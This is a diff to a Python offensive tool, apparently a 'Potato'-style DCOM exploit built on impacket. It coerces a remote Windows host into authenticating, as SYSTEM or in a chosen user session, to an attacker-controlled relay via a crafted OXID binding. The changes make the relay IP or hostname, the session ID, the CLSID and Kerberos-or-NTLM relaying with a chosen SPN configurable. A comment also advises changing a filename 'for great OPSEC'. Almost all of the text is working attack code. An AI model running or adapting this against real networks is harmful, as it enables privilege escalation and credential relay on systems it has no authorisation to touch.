@@ -82,12 +82,18 @@ class Potato:
         self.__aesKey = options.aesKey
         self.__doKerberos = options.k
         self.__kdcHost = options.dc_ip
+        self.__session_id = options.session_id
+        self.__clsid = options.clsid
+        self.__relay_hostname = options.relay_hostname
+        self.__relay_ip = options.relay_ip
+        self.__kerberos = options.kerberos
+        self.__spn = options.spn
         self.__dcom = None
 
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
-    def RemoteCreateInstance(self, clsId, relay_ip):
+    def RemoteCreateInstance(self):
         # Only supports one interface at a time
         self.__dcom.get_dce_rpc().bind(dcomrt.IID_IRemoteSCMActivator)
 
@@ -128,12 +134,14 @@ class Potato:
         properties = b''
         # SpecialSystemProperties 
         specialSystemProperties = SpecialPropertiesData()
-        if (False): # SYSTEM
+        if self.__session_id is None: # SYSTEM
+            logging.debug("Coercing authentication as SYSTEM")
             specialSystemProperties['dwSessionId'] = 0xFFFFFFFF
             specialSystemProperties['fRemoteThisSessionId'] = 0x0
             specialSystemProperties['dwFlags'] = 0x1
-        else: # Cross-Session
-            specialSystemProperties['dwSessionId'] = 0x2
+        else: # Cross-session
+            logging.debug(f"Coercing authentication in session {self.__session_id}")
+            specialSystemProperties['dwSessionId'] = int(self.__session_id)
             specialSystemProperties['fRemoteThisSessionId'] = 0x1
             specialSystemProperties['dwFlags'] = 0x2
         specialSystemProperties['dwDefaultAuthnLvl'] = rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
@@ -147,7 +155,8 @@ class Potato:
 
         # InstantiationInfo
         instantiationInfo = dcomrt.InstantiationInfoData()
-        instantiationInfo['classId'] = uuid.string_to_bin(clsId)
+        logging.debug(f"Using CLSID {self.__clsid}")
+        instantiationInfo['classId'] = uuid.string_to_bin(self.__clsid)
         instantiationInfo['classCtx'] = CLSCTX_REMOTE_SERVER
         instantiationInfo['cIID'] = 1
 
@@ -219,6 +228,7 @@ class Potato:
 
         # InstanceInfo
         instanceInfo = dcomrt.InstanceInfoData()
+        # You should modify this for great OPSEC
         instanceInfo['fileName'] = "hello.stg\x00"
         instanceInfo['mode'] = 0x12
         instanceInfo['ifdROT'] = dtypes.NULL
@@ -233,21 +243,33 @@ class Potato:
         # page number (16), random (6), page entry (10), process id (16), appartment id (16)
         pointerMoniker['std']['ipid'] = b'\x02\x78\x00\x00\x20\x06\xff\xff'+random.randbytes(8)
 
-        hostname_stringBinding = dcomrt.STRINGBINDING()
-        hostname_stringBinding['wTowerId'] = 7
-        hostname_stringBinding['aNetworkAddr'] = "kali\x00"
+        stringbindings = []
 
-        ip_stringBinding = dcomrt.STRINGBINDING()
-        ip_stringBinding['wTowerId'] = 7
-        ip_stringBinding['aNetworkAddr'] = relay_ip + "\x00"
+        if self.__relay_hostname is not None:
+            hostname_stringBinding = dcomrt.STRINGBINDING()
+            hostname_stringBinding['wTowerId'] = 7
+            hostname_stringBinding['aNetworkAddr'] = self.__relay_hostname + "\x00"
+            stringbindings.append(hostname_stringBinding)
+        
+        if self.__relay_ip is not None:
+            ip_stringBinding = dcomrt.STRINGBINDING()
+            ip_stringBinding['wTowerId'] = 7
+            ip_stringBinding['aNetworkAddr'] = self.__relay_ip + "\x00"
+            stringbindings.append(ip_stringBinding)
+        
+        logging.debug("OXID Resolver should be at %s" % ", ".join([a['aNetworkAddr'] for a in stringbindings]))
 
         securityBinding = dcomrt.SECURITYBINDING()
-        securityBinding['wAuthnSvc'] = rpcrt.RPC_C_AUTHN_GSS_KERBEROS # choose your poison
-        #securityBinding['wAuthnSvc'] = rpcrt.RPC_C_AUTHN_WINNT # choose your poison
+        if self.__kerberos:
+            securityBinding['wAuthnSvc'] = rpcrt.RPC_C_AUTHN_GSS_KERBEROS
+            securityBinding['aPrincName'] = self.__spn + "\x00"
+            logging.debug(f"Setting the desired SPN to {self.__spn}")
+        else:
+            securityBinding['wAuthnSvc'] = rpcrt.RPC_C_AUTHN_WINNT
+            securityBinding['aPrincName'] = "\x00"
         securityBinding['Reserved'] = 0xFFFF
-        securityBinding['aPrincName'] = "http/ca1.child.testlab.local\x00"
 
-        saResAddr = DUALSTRINGARRAY([hostname_stringBinding, ip_stringBinding], [securityBinding])
+        saResAddr = DUALSTRINGARRAY(stringbindings, [securityBinding])
         pointerMoniker['saResAddr'] = saResAddr.getData()
 
         objRefCustom = dcomrt.OBJREF_CUSTOM()
@@ -293,14 +315,12 @@ class Potato:
         request['pActProperties']['abData'] = list(objrefcustom.getData())
         resp = self.__dcom.get_dce_rpc().request(request)
 
-        # Now what?
-
-    def run(self, clsid, relay_ip):
+    def run(self):
         self.__dcom = dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                         self.__aesKey, authLevel=rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         
         try:
-            self.RemoteCreateInstance(clsid, relay_ip)
+            self.RemoteCreateInstance()
 
         except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -322,8 +342,12 @@ if __name__ == '__main__':
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     group = parser.add_argument_group('potato')
-    group.add_argument('-clsid', action='store', metavar="CLSID", help='A DCOM CLSID')
+    group.add_argument('-clsid', action='store', metavar="CLSID", help='A DCOM CLSID', required=True)
     group.add_argument('-relay-ip', action='store', metavar="IP", help='The IP of the relayer (yourself?)')
+    group.add_argument('-relay-hostname', action='store', metavar="HOSTNAME", help='The hostname of the relayer (yourself?)')
+    group.add_argument('-session-id', action='store', help='Session ID to perform cross-session activation (default to nothing = SYSTEM activation)')
+    group.add_argument('-kerberos', action='store_true', help='Perform relay to kerberos')
+    group.add_argument('-spn', action='store', metavar="PROTOCOL\\SERVER", help='SPN to use for the kerberos relaying')
 
     group = parser.add_argument_group('authentication')
 
@@ -378,9 +402,13 @@ if __name__ == '__main__':
         lmhash = ''
         nthash = ''
 
+    if options.relay_ip is None and options.relay_hostname is None:
+        logging.error("You need to specify either relay_ip or relay_hostname")
+        sys.exit(1)
+
     potato = Potato(domain, username, password, address, options.target_ip, options)
     try:
-        potato.run(options.clsid, options.relay_ip)
+        potato.run()
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
